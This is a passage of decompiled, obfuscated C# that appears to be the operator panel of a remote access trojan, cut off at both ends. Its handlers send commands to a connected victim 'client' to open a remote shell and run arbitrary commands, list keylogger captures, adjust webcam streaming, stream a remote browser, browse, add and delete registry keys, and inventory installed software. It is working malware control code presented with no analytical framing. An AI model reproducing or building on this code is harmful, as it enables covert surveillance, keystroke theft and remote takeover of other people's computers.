        if (!Class130.concurrentDictionary_3.ContainsKey(this.string_4))
        {
            Interaction.MsgBox("You are not connected to the client!", MsgBoxStyle.Critical, Application.ProductName);
        }
        else
        {
            Class136.Class138 class2;
            if (Operators.CompareString(this.vmethod_708().Text, "Start", true) == 0)
            {
                Class130.concurrentDictionary_3[this.string_4].REMOTE_BROWSER_IS_STREAMING = true;
                this.vmethod_466().Clear();
                this.vmethod_466().AppendText("Initializing...\r\n");
                string[] textArray1 = new string[9];
                textArray1[0] = "remotebrowser|";
                textArray1[1] = this.string_4;
                textArray1[2] = "|";
                textArray1[3] = Conversions.ToString(this.vmethod_714().Value);
                textArray1[4] = "|";
                textArray1[5] = Conversions.ToString(this.vmethod_464().Width);
                textArray1[6] = "|";
                textArray1[7] = Conversions.ToString(this.vmethod_464().Height);
                textArray1[8] = "|";
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(textArray1), Interaction.IIf(this.vmethod_678().Checked, "1", "0")), "|"), Interaction.IIf(this.vmethod_684().Checked, "1", "0")));
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
                this.vmethod_708().Text = "Stop";
                this.vmethod_708().Refresh();
                this.vmethod_464().Focus();
                this.vmethod_678().Enabled = false;
                this.vmethod_684().Enabled = false;
            }
            else if (Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0)
            {
                this.vmethod_708().Enabled = false;
                this.vmethod_466().AppendText("Stopping remote browser...\r\n");
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = "remotebrowser_stop|1";
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
                if (Class130.concurrentDictionary_3.ContainsKey(Class130.concurrentDictionary_3[this.string_4].REMOTE_BROWSER_SOCKET_ID))
                {
                    Class130.concurrentDictionary_3[Class130.concurrentDictionary_3[this.string_4].REMOTE_BROWSER_SOCKET_ID].SOCKET_DISCONNECT(ref true);
                }
                this.vmethod_678().Enabled = true;
                this.vmethod_684().Enabled = true;
            }
        }
    }

    private void method_236(object sender, EventArgs e)
    {
        Class136.Class138 class2;
        this.vmethod_352().Enabled = false;
        this.vmethod_510().Enabled = false;
        this.vmethod_352().Clear();
        this.vmethod_510().Clear();
        this.vmethod_710().Enabled = false;
        if (Operators.CompareString(this.vmethod_710().Text, "Start", true) == 0)
        {
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "shell_start|1";
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
        else
        {
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "shell_stop|1";
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_237(object sender, EventArgs e)
    {
        this.vmethod_556().BringToFront();
        this.vmethod_556().Visible = true;
        this.vmethod_280().Clear();
        this.vmethod_280().Enabled = false;
        this.vmethod_388().Enabled = false;
        this.vmethod_712().Enabled = false;
        this.vmethod_702().Enabled = false;
        this.vmethod_704().Enabled = false;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "klgoff_list|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_238(object sender, ScrollEventArgs e)
    {
        this.vmethod_514().Text = Conversions.ToString(this.vmethod_714().Value) + "%";
        if (Operators.CompareString(this.string_4, null, true) != 0)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "remotebrowser_quality|" + Conversions.ToString(this.vmethod_714().Value);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_239(object sender, ColumnClickEventArgs e)
    {
        SortOrder ascending;
        if (this.vmethod_578().Sorting == SortOrder.Descending)
        {
            this.vmethod_578().Sorting = SortOrder.Ascending;
            ascending = SortOrder.Ascending;
        }
        else
        {
            this.vmethod_578().Sorting = SortOrder.Descending;
            ascending = SortOrder.Descending;
        }
        this.vmethod_578().ListViewItemSorter = new Class143(e.Column, ascending);
    }

    public void method_24(ref string[] string_12)
    {
        ImageList list1 = new ImageList();
        list1.ImageSize = new Size(0x10, 0x10);
        ImageList list = list1;
        if (this.vmethod_720().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_720().Invoke(new Delegate15(this.method_24), args);
        }
        else
        {
            this.vmethod_754().SendToBack();
            this.vmethod_754().Visible = false;
            this.vmethod_730().Enabled = false;
            this.vmethod_728().Enabled = false;
            this.vmethod_726().Enabled = false;
            this.vmethod_744().Enabled = false;
            this.vmethod_724().Enabled = false;
            this.vmethod_746().Enabled = false;
            this.vmethod_748().Enabled = false;
            this.vmethod_748().Update();
            this.vmethod_750().Update();
            this.vmethod_748().Items.Clear();
            this.vmethod_750().Items.Clear();
            this.vmethod_750().SmallImageList = list;
            this.vmethod_748().SmallImageList = list;
            this.vmethod_752().set_MaximumValue(1);
            this.vmethod_752().Visible = true;
            this.vmethod_742().Maximum = 1;
            this.vmethod_752().set_MaximumValue(string_12.Length);
            this.string_7 = string_12[string_12.Length - 1];
            if (Strings.InStr(this.string_7, "-2147483648", CompareMethod.Text) != 0)
            {
                this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483648", "HKEY_CLASSES_ROOT", 1, -1, CompareMethod.Text);
            }
            if (Strings.InStr(this.string_7, "-2147483647", CompareMethod.Text) != 0)
            {
                this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483647", "HKEY_CURRENT_USER", 1, -1, CompareMethod.Text);
            }
            if (Strings.InStr(this.string_7, "-2147483646", CompareMethod.Text) != 0)
            {
                this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483646", "HKEY_LOCAL_MACHINE", 1, -1, CompareMethod.Text);
            }
            if (Strings.InStr(this.string_7, "-2147483645", CompareMethod.Text) != 0)
            {
                this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483645", "HKEY_USERS", 1, -1, CompareMethod.Text);
            }
            if (Strings.InStr(this.string_7, "-2147483643", CompareMethod.Text) != 0)
            {
                this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483643", "HKEY_CURRENT_CONFIG", 1, -1, CompareMethod.Text);
            }
            this.vmethod_752().Visible = true;
            this.vmethod_742().Maximum = this.vmethod_752().get_MaximumValue();
            this.vmethod_752().set_Value(0);
            this.vmethod_742().Value = 0;
            List<ListViewItem> list2 = new List<ListViewItem>();
            List<ListViewItem> list3 = new List<ListViewItem>();
            this.vmethod_750().Items.Clear();
            Image image = Image.FromFile(Application.StartupPath + @"\data\media\icons\regkey.png");
            Image image2 = Image.FromFile(Application.StartupPath + @"\data\media\icons\regedit_sz.png");
            Image image3 = Image.FromFile(Application.StartupPath + @"\data\media\icons\regvalue_bin.png");
            list.Images.Add("key", image);
            list.Images.Add("sz", image2);
            list.Images.Add("bin", image3);
            int num2 = string_12.Length - 2;
            for (int i = 0; i <= num2; i++)
            {
                ListViewItem item2 = new ListViewItem();
                ListViewItem item = new ListViewItem();
                if (Strings.InStr(string_12[i], ",", CompareMethod.Text) <= 0)
                {
                    string[] strArray2 = Strings.Split(string_12[i], ":", -1, CompareMethod.Text);
                    item.Text = Encoding.UTF8.GetString(Convert.FromBase64String(strArray2[0]));
                    item.ImageKey = "key";
                    item.Tag = Encoding.UTF8.GetString(Convert.FromBase64String(strArray2[1]));
                    if (Operators.CompareString(Conversions.ToString(Enumerable.Last<char>(item.Tag.ToString())), @"\", true) != 0)
                    {
                        item.Tag = Operators.ConcatenateObject(item.Tag, @"\");
                    }
                    list3.Add(item);
                }
                else
                {
                    string[] strArray = Strings.Split(string_12[i], ",", -1, CompareMethod.Text);
                    string text = "REG_SZ";
                    string str2 = "sz";
                    string left = strArray[1];
                    if (Operators.CompareString(left, "0", true) == 0)
                    {
                        text = "REG_NONE";
                        str2 = "sz";
                    }
                    else if (Operators.CompareString(left, "1", true) == 0)
                    {
                        text = "REG_SZ";
                        str2 = "sz";
                    }
                    else if (Operators.CompareString(left, "2", true) == 0)
                    {
                        text = "REG_EXPAND_SZ";
                        str2 = "sz";
                    }
                    else if (Operators.CompareString(left, "3", true) == 0)
                    {
                        text = "REG_BINARY";
                        str2 = "bin";
                    }
                    else if (Operators.CompareString(left, "4", true) == 0)
                    {
                        text = "REG_DWORD";
                        str2 = "bin";
                    }
                    else if (Operators.CompareString(left, "5", true) == 0)
                    {
                        text = "REG_DWORD_BIG_ENDIAN";
                        str2 = "bin";
                    }
                    else if (Operators.CompareString(left, "6", true) == 0)
                    {
                        text = "REG_LINK";
                        str2 = "sz";
                    }
                    else if (Operators.CompareString(left, "7", true) == 0)
                    {
                        text = "REG_MULTI_SZ";
                        str2 = "sz";
                    }
                    else if (Operators.CompareString(left, "8", true) == 0)
                    {
                        text = "REG_RESOURCE_LIST";
                        str2 = "sz";
                    }
                    else if (Operators.CompareString(left, "9", true) == 0)
                    {
                        text = "REG_FULL_RESOURCE_DESCRIPTOR";
                        str2 = "sz";
                    }
                    else if (Operators.CompareString(left, "10", true) == 0)
                    {
                        text = "REG_RESOURCE_REQUIREMENTS_LIST";
                        str2 = "sz";
                    }
                    else if (Operators.CompareString(left, "11", true) == 0)
                    {
                        text = "REG_QWORD";
                        str2 = "bin";
                    }
                    item2.Text = Encoding.UTF8.GetString(Convert.FromBase64String(strArray[0]));
                    item2.Tag = this.string_7;
                    item2.ImageKey = str2;
                    item2.SubItems.Add(text);
                    item2.SubItems.Add(Encoding.UTF8.GetString(Convert.FromBase64String(strArray[2])));
                    list2.Add(item2);
                }
                if (this.vmethod_752().get_Value() < this.vmethod_752().get_MaximumValue())
                {
                    ZeroitAnidasoCircleProgress progress;
                    (progress = this.vmethod_752()).set_Value(progress.get_Value() + 1);
                    this.vmethod_742().Value = this.vmethod_752().get_Value();
                }
                Application.DoEvents();
            }
            this.vmethod_736().Text = "Keys: " + Conversions.ToString(list3.Count);
            this.vmethod_738().Text = "Values: " + Conversions.ToString(list2.Count);
            this.vmethod_750().Items.AddRange(list2.ToArray());
            this.vmethod_748().Items.AddRange(list3.ToArray());
            if (this.fRegAdd_0 != null)
            {
                this.fRegAdd_0.string_1 = this.string_7;
                this.fRegAdd_0.vmethod_12().Enabled = true;
            }
            this.vmethod_752().set_Value(this.vmethod_752().get_MaximumValue());
            this.vmethod_752().Visible = false;
            if (this.string_7.Length >= 3)
            {
                this.vmethod_724().Enabled = true;
            }
            this.vmethod_730().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_7.Length > 3, true, false));
            if (this.collection_0.Count > 0)
            {
                this.vmethod_728().Enabled = true;
            }
            this.vmethod_726().Enabled = true;
            this.vmethod_724().Enabled = true;
            this.vmethod_744().Enabled = true;
            this.vmethod_746().Enabled = true;
            this.vmethod_748().Enabled = true;
            this.vmethod_750().Enabled = true;
            this.vmethod_742().Value = 0;
        }
    }

    private void method_240(object sender, ScrollEventArgs e)
    {
        this.vmethod_254().Text = Conversions.ToString(this.vmethod_716().Value) + "%";
        if (Operators.CompareString(this.string_4, null, true) != 0)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "webcam_quality|" + Conversions.ToString(this.vmethod_716().Value);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_241(object sender, EventArgs e)
    {
        if (this.fThumb_0 != null)
        {
            this.fThumb_0.method_3();
        }
        else
        {
            this.fThumb_0 = new fThumb();
            this.fThumb_0.Opacity = 0.0;
            this.fThumb_0.Show();
        }
        if (this.fThumb_0 != null)
        {
            GClass7 class2 = this.vmethod_720();
            if ((class2.SelectedItems.Count > 0) && Class136.smethod_5(class2.SelectedItems[0].Text))
            {
                this.fThumb_0.method_0(class2.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
                this.fThumb_0.method_1();
                Class136.Class138 class3 = new Class136.Class138();
                class3.string_0 = this.string_4;
                class3.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", class2.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
                class3.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                {
                    new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                }
            }
            class2 = null;
        }
    }

    private void method_242(object sender, FormatRowEventArgs e)
    {
        Class128 class1 = (Class128) e.get_Model();
        e.get_Item().ForeColor = Color.Black;
    }

    private void method_243(object sender, ColumnClickEventArgs e)
    {
        SortOrder ascending;
        if (this.vmethod_78().Sorting == SortOrder.Descending)
        {
            this.vmethod_78().Sorting = SortOrder.Ascending;
            ascending = SortOrder.Ascending;
        }
        else
        {
            this.vmethod_78().Sorting = SortOrder.Descending;
            ascending = SortOrder.Descending;
        }
        this.vmethod_78().ListViewItemSorter = new Class143(e.Column, ascending);
    }

    private void method_244(object sender, EventArgs e)
    {
        this.vmethod_444().Text = "Selected: " + Conversions.ToString(this.vmethod_720().SelectedItems.Count);
        if ((this.fThumb_0 != null) && this.fThumb_0.Visible)
        {
            GClass7 class2 = this.vmethod_720();
            if ((class2.SelectedItems.Count > 0) && Class136.smethod_5(class2.SelectedItems[0].Text))
            {
                this.fThumb_0.method_0(class2.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
                Class136.Class138 class3 = new Class136.Class138();
                class3.string_0 = this.string_4;
                class3.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", class2.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
                class3.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                {
                    new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                }
                this.fThumb_0.method_1();
            }
            class2 = null;
        }
    }

    private void method_245(object sender, MouseEventArgs e)
    {
        this.vmethod_598().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_578().SelectedItems.Count > 0, true, false));
        this.vmethod_586().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_578().SelectedItems.Count > 0, true, false));
    }

    private void method_246(object sender, EventArgs e)
    {
        this.vmethod_730().Enabled = false;
        this.vmethod_728().Enabled = false;
        this.vmethod_726().Enabled = false;
        this.vmethod_744().Enabled = false;
        this.vmethod_724().Enabled = false;
        this.vmethod_746().Enabled = false;
        this.vmethod_748().Enabled = false;
        this.string_7 = string.Empty;
        this.vmethod_734().Text = "Path: N/A";
        this.vmethod_748().Items.Clear();
        this.vmethod_750().Items.Clear();
        this.vmethod_754().BringToFront();
        this.vmethod_754().Visible = true;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "reg_hkeys_get|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_247(object sender, ToolStripItemClickedEventArgs e)
    {
    }

    private void method_248(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 15;
        this.method_41();
    }

    private void method_249(object sender, EventArgs e)
    {
        if (this.vmethod_746().Items.Count > 0)
        {
            this.collection_0.Clear();
            this.vmethod_746().Enabled = false;
            this.vmethod_748().Enabled = false;
            this.vmethod_750().Items.Clear();
            Class127 selectedItem = (Class127) this.vmethod_746().SelectedItem;
            this.vmethod_754().BringToFront();
            this.vmethod_754().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "reg_keys_root_get|" + Conversions.ToString(this.vmethod_746().SelectedIndex);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    public void method_25(ref string string_12)
    {
        string key = string.Empty;
        string text = string.Empty;
        string str4 = string.Empty;
        string str5 = string.Empty;
        string str6 = string.Empty;
        string str7 = string.Empty;
        string str = string.Empty;
        ImageList list1 = new ImageList();
        list1.ImageSize = new Size(0x10, 0x10);
        ImageList list2 = list1;
        if (this.vmethod_550().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_550().Invoke(new Delegate26(this.method_25), args);
        }
        else
        {
            List<ListViewItem> list3 = new List<ListViewItem>();
            this.vmethod_550().Items.Clear();
            this.vmethod_550().SmallImageList = list2;
            this.vmethod_544().Value = 0;
            this.vmethod_544().Maximum = 1;
            this.vmethod_548().set_MaximumValue(1);
            this.vmethod_548().Visible = true;
            List<JToken> list = Enumerable.ToList<JToken>(JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"]);
            this.vmethod_548().set_MaximumValue(list.Count - 1);
            this.vmethod_548().set_Value(0);
            this.vmethod_544().Maximum = this.vmethod_548().get_MaximumValue();
            this.vmethod_542().Text = "Installed software: " + Conversions.ToString(list.Count);
            this.vmethod_546().SendToBack();
            this.vmethod_546().Visible = false;
            List<JToken>.Enumerator enumerator2 = list.GetEnumerator();
            while (enumerator2.MoveNext())
            {
                JToken current = enumerator2.Current;
                ListViewItem item = new ListViewItem();
                key = current["n"].ToString();
                text = current["path"].ToString();
                str4 = current["pb"].ToString();
                str5 = current["date"].ToString();
                str6 = current["sz"].ToString();
                str7 = current["v"].ToString();
                str = current["silent"].ToString();
                byte[] buffer = Convert.FromBase64String(current["icon"].ToString());
                Image image = Class136.smethod_18(ref buffer);
                list2.Images.Add(key, image);
                item.Text = key;
                item.ImageKey = key;
                item.SubItems.Add(text);
                item.SubItems.Add(str4);
                item.SubItems.Add(str5);
                item.SubItems.Add(str6);
                item.SubItems.Add(str7);
                item.Tag = str;
                str = Conversions.ToString(Interaction.IIf(str.Length > 3, "Yes", "No"));
                item.SubItems.Add(str);
                list3.Add(item);
                if (this.vmethod_548().get_Value() < this.vmethod_548().get_MaximumValue())
                {
                    ZeroitAnidasoCircleProgress progress;
                    ToolStripProgressBar bar;
                    (progress = this.vmethod_548()).set_Value(progress.get_Value() + 1);
                    (bar = this.vmethod_544()).Value = bar.Value + 1;
                }
                Application.DoEvents();
            }
            this.vmethod_548().set_Value(this.vmethod_548().get_MaximumValue());
            this.vmethod_548().Visible = false;
            this.vmethod_550().Enabled = true;
            this.vmethod_550().Items.AddRange(list3.ToArray());
            IEnumerator enumerator = this.vmethod_550().Columns.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ColumnHeader) enumerator.Current).Tag = SortOrder.None;
            }
            this.vmethod_544().Value = 0;
        }
    }

    private void method_250(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_624().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_251(object sender, ColumnClickEventArgs e)
    {
        SortOrder ascending;
        if (this.vmethod_624().Sorting == SortOrder.Descending)
        {
            this.vmethod_624().Sorting = SortOrder.Ascending;
            ascending = SortOrder.Ascending;
        }
        else
        {
            this.vmethod_624().Sorting = SortOrder.Descending;
            ascending = SortOrder.Descending;
        }
        this.vmethod_624().ListViewItemSorter = new Class143(e.Column, ascending);
    }

    private void method_252(object sender, EventArgs e)
    {
        this.vmethod_740().Text = "Selected: " + Conversions.ToString(this.vmethod_748().SelectedItems.Count);
    }

    private void method_253(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Enter)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "shell_exec|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.vmethod_510().Text));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
            this.vmethod_510().Clear();
            this.vmethod_510().Select();
            e.Handled = true;
            e.SuppressKeyPress = true;
        }
    }

    private void method_254(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_255(object sender, EventArgs e)
    {
        if (this.string_7.Length > 3)
        {
            this.collection_0.Add(this.string_7, null, null, null);
            this.vmethod_730().Enabled = false;
            if (Class136.smethod_20(this.string_7, '\\') > 1)
            {
                this.string_7 = Strings.Mid(this.string_7, 1, this.string_7.Length - 1);
                this.string_7 = Strings.Mid(this.string_7, 1, this.string_7.LastIndexOf(@"\") + 1);
            }
            this.vmethod_730().Enabled = false;
            this.vmethod_728().Enabled = false;
            this.vmethod_726().Enabled = false;
            this.vmethod_744().Enabled = false;
            this.vmethod_724().Enabled = false;
            this.vmethod_746().Enabled = false;
            this.vmethod_748().Enabled = false;
            this.vmethod_750().Items.Clear();
            this.vmethod_754().BringToFront();
            this.vmethod_754().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "reg_keys_get|" + this.string_7;
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_256(object sender, EventArgs e)
    {
        if (this.collection_0.Count > 0)
        {
            this.vmethod_730().Enabled = false;
            this.vmethod_728().Enabled = false;
            this.vmethod_726().Enabled = false;
            this.vmethod_744().Enabled = false;
            this.vmethod_724().Enabled = false;
            this.vmethod_746().Enabled = false;
            this.vmethod_748().Enabled = false;
            this.vmethod_750().Items.Clear();
            this.string_7 = Conversions.ToString(this.collection_0[this.collection_0.Count]);
            this.collection_0.Remove(this.collection_0.Count);
            this.vmethod_754().BringToFront();
            this.vmethod_754().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "reg_keys_get|" + this.string_7;
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_257(object sender, EventArgs e)
    {
        if (this.string_7.Length >= 3)
        {
            this.vmethod_730().Enabled = false;
            this.vmethod_728().Enabled = false;
            this.vmethod_726().Enabled = false;
            this.vmethod_744().Enabled = false;
            this.vmethod_724().Enabled = false;
            this.vmethod_746().Enabled = false;
            this.vmethod_748().Enabled = false;
            this.vmethod_750().Items.Clear();
            this.vmethod_750().BackColor = Color.White;
            this.vmethod_754().BringToFront();
            this.vmethod_754().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "reg_keys_get|" + Strings.Split(this.string_7, @"\", -1, CompareMethod.Text)[0] + @"\";
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_258(object sender, EventArgs e)
    {
        if (this.string_7.Length >= 3)
        {
            this.vmethod_730().Enabled = false;
            this.vmethod_728().Enabled = false;
            this.vmethod_726().Enabled = false;
            this.vmethod_744().Enabled = false;
            this.vmethod_724().Enabled = false;
            this.vmethod_746().Enabled = false;
            this.vmethod_748().Enabled = false;
            this.vmethod_750().Items.Clear();
            this.vmethod_754().BringToFront();
            this.vmethod_754().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "reg_keys_get|" + this.string_7;
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_259(object sender, EventArgs e)
    {
    }

    private void method_26(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 1;
        this.method_80();
        this.method_41();
    }

    private void method_260(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_261(object sender, EventArgs e)
    {
        if (this.fRegAdd_0 != null)
        {
            this.fRegAdd_0.Visible = true;
        }
        else
        {
            this.fRegAdd_0 = new fRegAdd();
            this.fRegAdd_0.Visible = true;
            this.fRegAdd_0.string_0 = this.string_4;
            this.fRegAdd_0.string_1 = this.string_7;
            Form form = this.fRegAdd_0;
            Rectangle workingArea = Screen.FromPoint(form.Location).WorkingArea;
            form.Location = new Point(workingArea.Left + ((workingArea.Width - form.Width) / 2), workingArea.Top + ((workingArea.Height - form.Height) / 2));
            this.fRegAdd_0.Opacity = 100.0;
        }
    }

    private void method_262(object sender, EventArgs e)
    {
        if (this.vmethod_750().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_750();
            if (MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject("Delete " + Conversions.ToString(class2.SelectedItems.Count), Interaction.IIf(class2.SelectedItems.Count > 1, " entries?", " entry?"))), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
            {
                int num = class2.Items.Count - 1;
                int num2 = 0;
                while (true)
                {
                    Class136.Class138 class3;
                    if (num2 > num)
                    {
                        Thread.Sleep(200);
                        class3 = new Class136.Class138();
                        class3.string_0 = this.string_4;
                        class3.string_1 = "reg_keys_get|" + this.string_7;
                        class3.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                        {
                            new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                        }
                        break;
                    }
                    if (class2.Items[num2].Selected)
                    {
                        class3 = new Class136.Class138();
                        class3.string_0 = this.string_4;
                        class3.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("reg_val_del|", class2.Items[num2].Tag), "|"), Convert.ToBase64String(Encoding.UTF8.GetBytes(class2.Items[num2].Text))));
                        class3.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                        {
                            new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                        }
                    }
                    num2++;
                }
            }
            class2 = null;
        }
    }

    private void method_263(object sender, EventArgs e)
    {
        string str = Interaction.InputBox("Enter new key name", Application.ProductName, string.Empty, -1, -1);
        if (str.Length != 0)
        {
            if (str.Length <= 0xff)
            {
                Class136.Class138 class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = "reg_key_add|" + this.string_7 + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_7 + str));
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            else
            {
                Interaction.MsgBox("Invalid key name!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
        }
    }

    private void method_264(object sender, EventArgs e)
    {
        if (this.vmethod_748().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_748();
            if (MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject("Delete " + Conversions.ToString(class2.SelectedItems.Count), Interaction.IIf(class2.SelectedItems.Count > 1, " keys?", " entry?"))), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
            {
                int num = class2.Items.Count - 1;
                int num2 = 0;
                while (true)
                {
                    Class136.Class138 class3;
                    if (num2 > num)
                    {
                        class3 = new Class136.Class138();
                        class3.string_0 = this.string_4;
                        class3.string_1 = "reg_keys_get|" + this.string_7;
                        class3.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                        {
                            new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                        }
                        break;
                    }
                    if (class2.Items[num2].Selected)
                    {
                        class3 = new Class136.Class138();
                        class3.string_0 = this.string_4;
                        class3.string_1 = "reg_key_del|" + this.string_7 + class2.Items[num2].Text;
                        class3.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                        {
                            new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                        }
                    }
                    num2++;
                }
            }
            class2 = null;
        }
    }

    private void method_265(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_266(object sender, EventArgs e)
    {
        this.vmethod_444().Text = "Selected: 0";
    }

    private void method_267(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_720();
        if (Class136.smethod_5(class2.SelectedItems[0].Text))
        {
            if (this.fThumb_0 != null)
            {
                this.fThumb_0.method_3();
            }
            else
            {
                this.fThumb_0 = new fThumb();
                this.fThumb_0.Opacity = 0.0;
                this.fThumb_0.Show();
            }
            if (this.fThumb_0 != null)
            {
